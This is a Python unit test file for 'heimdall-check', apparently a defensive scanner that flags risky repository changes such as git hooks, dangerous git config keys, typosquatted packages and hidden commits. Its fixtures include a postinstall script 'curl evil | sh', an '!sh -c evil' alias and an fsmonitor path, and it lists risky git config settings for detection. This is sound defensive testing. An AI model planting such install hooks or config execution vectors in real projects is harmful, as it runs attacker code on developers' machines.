"""Heimdall's checks: run with  python3 -m unittest discover tests/unit  from the Gleipnir folder."""
import importlib.machinery
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest

sys.dont_write_bytecode = True  # no __pycache__ beside the scripts

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPT = os.path.join(HERE, "..", "..", "scripts", "files", "heimdall-check")


def load_heimdall():
    loader = importlib.machinery.SourceFileLoader("heimdall_check", SCRIPT)
    spec = importlib.util.spec_from_loader("heimdall_check", loader)
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


heimdall = load_heimdall()


def write(path, text, mode=None):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as fh:
        fh.write(text)
    if mode is not None:
        os.chmod(path, mode)


class GitConfigTest(unittest.TestCase):
    def names(self, text):
        return [name for name, _ in heimdall.git_config_entries(text)]

    def test_sections_and_keys(self):
        text = '[core]\n\tfsmonitor = /tmp/x\n[filter "lfs"]\n\tclean = git-lfs clean\n[remote "origin"]\n\turl = x\n'
        self.assertEqual(self.names(text), ["core.fsmonitor", "filter.lfs.clean", "remote.origin.url"])

    def test_key_on_the_section_line_and_old_form(self):
        self.assertEqual(self.names("[core] fsmonitor = x\n[diff.foo]\ncommand = y\n"),
                         ["core.fsmonitor", "diff.foo.command"])

    def test_continuation_lines(self):
        entries = heimdall.git_config_entries('[alias]\n\tx = !sh -c \\\n evil\n')
        self.assertEqual(entries, [("alias.x", "!sh -c  evil")])

    def test_unreadable_lines_are_kept(self):
        self.assertIn(("?", "[weird"), heimdall.git_config_entries("[weird\n"))

    def test_risky_settings(self):
        risky = ["core.fsmonitor", "core.hookspath", "core.sshcommand", "filter.lfs.clean", "alias.st",
                 "include.path", "includeif.gitdir:/x/.path", "diff.x.textconv", "submodule.a.update",
                 "credential.helper", "gpg.program", "remote.origin.uploadpack"]
        for name in risky:
            self.assertTrue(heimdall.RISKY_GIT_CONFIG.match(name), name)
        for name in ["remote.origin.url", "user.name", "core.autocrlf", "branch.main.remote"]:
            self.assertFalse(heimdall.RISKY_GIT_CONFIG.match(name), name)


class SensitiveTest(unittest.TestCase):
    def test_names(self):
        for rel in ["package.json", "apps/backend/lib/deeper/package.json", "a/b.sh", "vite.config.ts",
                    ".vscode/tasks.json", ".github/workflows/ci.yml", "backend/composer.json", ".gitattributes"]:
            self.assertTrue(heimdall.is_sensitive(rel), rel)
        for rel in ["src/app.ts", "node_modules/x/package.json", ".idea/workspace.xml", "README.md"]:
            self.assertFalse(heimdall.is_sensitive(rel), rel)


class WorkingTreeTest(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp()
        os.makedirs(os.path.join(self.root, ".git", "hooks"))

    def tearDown(self):
        for cur, dirs, _ in os.walk(self.root):
            for d in dirs:
                try:
                    os.chmod(os.path.join(cur, d), 0o755)
                except OSError:
                    pass
        shutil.rmtree(self.root, ignore_errors=True)

    def path(self, *parts):
        return os.path.join(self.root, *parts)

    def diff(self, change):
        before = heimdall.take_state(self.root)
        change()
        return "\n".join(heimdall.diff_states(before, heimdall.take_state(self.root)))

    def test_changed_hook(self):  # T-11
        write(self.path(".git", "hooks", "post-checkout"), "#!/bin/sh\necho one\n", 0o755)
        out = self.diff(lambda: write(self.path(".git", "hooks", "post-checkout"), "#!/bin/sh\necho two\n"))
        self.assertIn("changed .git/hooks/post-checkout", out)

    def test_hook_made_runnable(self):
        write(self.path(".git", "hooks", "pre-push"), "#!/bin/sh\n", 0o644)
        out = self.diff(lambda: os.chmod(self.path(".git", "hooks", "pre-push"), 0o755))
        self.assertIn("changed .git/hooks/pre-push", out)

    def test_removed_hook(self):
        write(self.path(".git", "hooks", "pre-commit"), "#!/bin/sh\n", 0o755)
        out = self.diff(lambda: os.remove(self.path(".git", "hooks", "pre-commit")))
        self.assertIn("removed .git/hooks/pre-commit", out)

    def test_deep_package_json(self):  # T-12
        out = self.diff(lambda: write(self.path("apps", "backend", "lib", "deeper", "package.json"), "{}"))
        self.assertIn("added   apps/backend/lib/deeper/package.json", out)

    def test_risky_git_setting(self):
        write(self.path(".git", "config"), "[core]\n\tbare = false\n")
        out = self.diff(lambda: write(self.path(".git", "config"), "[core]\n\tbare = false\n\tfsmonitor = /tmp/x\n"))
        self.assertIn("core.fsmonitor=/tmp/x", out)

    def test_link_is_fingerprinted_by_its_target(self):
        write(self.path("a.json"), "{}")
        write(self.path("b.json"), "{}")
        os.symlink("a.json", self.path("package.json"))
        def repoint():
            os.remove(self.path("package.json"))
            os.symlink("b.json", self.path("package.json"))
        out = self.diff(repoint)
        self.assertIn("changed package.json", out)
        self.assertIn("package.json is a link", out)

    def test_package_changes(self):
        lock = self.path("frontend", "package-lock.json")
        write(lock, json.dumps({"packages": {"": {}, "node_modules/lodash": {"version": "4.17.21"}}}))
        out = self.diff(lambda: write(lock, json.dumps({"packages": {"": {}, "node_modules/lodash": {"version": "4.17.21"},
                                                                     "node_modules/lodahs": {"version": "1.0.0"}}})))
        self.assertIn("added    frontend: lodahs@1.0.0", out)

    def test_big_file_is_reported_not_read_whole(self):
        old = heimdall.MAX_HASH_BYTES
        heimdall.MAX_HASH_BYTES = 1024
        try:
            write(self.path("build.sh"), "x" * 4096)
            state = heimdall.take_state(self.root)
        finally:
            heimdall.MAX_HASH_BYTES = old
        self.assertIn("build.sh is too big to check fully", state["incomplete"])

    @unittest.skipIf(hasattr(os, "geteuid") and os.geteuid() == 0, "root can read everything")
    def test_unreadable_folder_is_reported(self):
        write(self.path("hidden", "build.sh"), "x")
        os.chmod(self.path("hidden"), 0o000)
        state = heimdall.take_state(self.root)
        self.assertIn("couldn't read the folder hidden", state["incomplete"])

    def test_claude_code_settings_and_deploy_files(self):
        out = self.diff(lambda: (write(self.path(".mcp.json"), "{}"),
                                 write(self.path(".claude", "settings.json"), "{}"),
                                 write(self.path(".github", "actions", "x", "action.yml"), "runs: {}"),
                                 write(self.path("Dockerfile"), "FROM scratch"),
                                 write(self.path("vercel.json"), "{}")))
        for name in (".mcp.json", ".claude/settings.json", ".github/actions/x/action.yml", "Dockerfile", "vercel.json"):
            self.assertIn(f"added   {name}", out)

    def test_runnable_file_counts_whatever_its_name(self):
        out = self.diff(lambda: write(self.path("bin", "serve"), "#!/bin/sh\n", 0o755))
        self.assertIn("added   bin/serve", out)
        # ...but not inside dependencies, and not when it isn't runnable
        write(self.path("src", "helper"), "x")
        out = self.diff(lambda: (write(self.path("node_modules", "x", "cli"), "x", 0o755),
                                 write(self.path("src", "helper"), "y")))
        self.assertEqual(out, "")

    def test_making_a_file_runnable_is_a_change(self):
        write(self.path("tool"), "x", 0o644)
        out = self.diff(lambda: os.chmod(self.path("tool"), 0o755))
        self.assertIn("added   tool", out)   # it wasn't a watched file before; now it is
        out = self.diff(lambda: os.chmod(self.path("tool"), 0o644))
        self.assertIn("removed tool", out)

    def test_git_attributes_and_alternates(self):
        out = self.diff(lambda: (write(self.path(".git", "info", "attributes"), "*.c filter=x"),
                                 write(self.path(".git", "objects", "info", "alternates"), "/elsewhere")))
        self.assertIn("added   .git/info/attributes", out)
        self.assertIn("added   .git/objects/info/alternates", out)

    def test_big_file_edited_past_the_hashed_part(self):
        old = heimdall.MAX_HASH_BYTES
        heimdall.MAX_HASH_BYTES = 1024
        try:
            write(self.path("build.sh"), "x" * 4096)
            before = heimdall.take_state(self.root)
            time.sleep(0.01)
            with open(self.path("build.sh"), "r+") as fh:   # same size, same first 1024 bytes
                fh.seek(4090)
                fh.write("evil!!")
            out = "\n".join(heimdall.diff_states(before, heimdall.take_state(self.root)))
        finally:
            heimdall.MAX_HASH_BYTES = old
        self.assertIn("changed build.sh", out)

    def test_terminal_escapes_are_made_harmless(self):
        out = self.diff(lambda: write(self.path("evil\x1b[31mred.sh"), "x"))
        self.assertNotIn("\x1b", out)
        self.assertIn("evil?[31mred.sh", out)


@unittest.skipUnless(shutil.which("git"), "needs git")
class BranchReviewTest(unittest.TestCase):
    """What gleipnir-review shows: the branch's commits, whatever the working files look like."""

    def setUp(self):
        self.repo = tempfile.mkdtemp()
        # Written for older git too (macOS's own can predate init -b and switch)
        self.git("init", "-q")
        self.git("symbolic-ref", "HEAD", "refs/heads/main")
        write(os.path.join(self.repo, "package.json"), '{"scripts": {}}')
        self.git("add", "-A")
        self.git("commit", "-qm", "base")

    def tearDown(self):
        shutil.rmtree(self.repo, ignore_errors=True)

    def git(self, *args):
        subprocess.run(["git", "-C", self.repo, "-c", "user.name=t", "-c", "user.email=t@example.invalid",
                        "-c", "commit.gpgsign=false", *args], check=True, capture_output=True)

    def test_hidden_commit_is_reported(self):
        self.git("checkout", "-q", "-b", "wip/x")
        write(os.path.join(self.repo, "package.json"), '{"scripts": {"postinstall": "curl evil | sh"}}')
        write(os.path.join(self.repo, "package-lock.json"),
              json.dumps({"packages": {"": {}, "node_modules/lodahs": {"version": "1.0.0"}}}))
        self.git("add", "-A")
        self.git("commit", "-qm", "sneaky")
        # The working files are put back, so only the commit has the change
        self.git("checkout", "-q", "main", "--", "package.json")
        out = "\n".join(heimdall.review_lines(self.repo, "refs/heads/main", "refs/heads/wip/x"))
        self.assertIn("changed package.json", out)
        self.assertIn("added   package-lock.json", out)
        self.assertIn("added    lodahs@1.0.0", out)

    def test_nothing_risky(self):
        self.git("checkout", "-q", "-b", "wip/y")
        write(os.path.join(self.repo, "src", "app.ts"), "export {}")
        self.git("add", "-A")
        self.git("commit", "-qm", "code")
        self.assertEqual(heimdall.review_lines(self.repo, "refs/heads/main", "refs/heads/wip/y"), [])

    def test_runnable_file_in_a_commit(self):
        self.git("checkout", "-q", "-b", "wip/z")
        write(os.path.join(self.repo, "scripts", "deploy"), "#!/bin/sh\n", 0o755)
        write(os.path.join(self.repo, "src", "app.ts"), "export {}")
        self.git("add", "-A")
        self.git("commit", "-qm", "tool")
        out = "\n".join(heimdall.review_lines(self.repo, "refs/heads/main", "refs/heads/wip/z"))
        self.assertIn("added   scripts/deploy", out)
        self.assertNotIn("app.ts", out)

    def test_no_base_branch(self):
        out = "\n".join(heimdall.review_lines(self.repo, "", "refs/heads/main"))
        self.assertIn("added   package.json", out)


if __name__ == "__main__":
    unittest.main()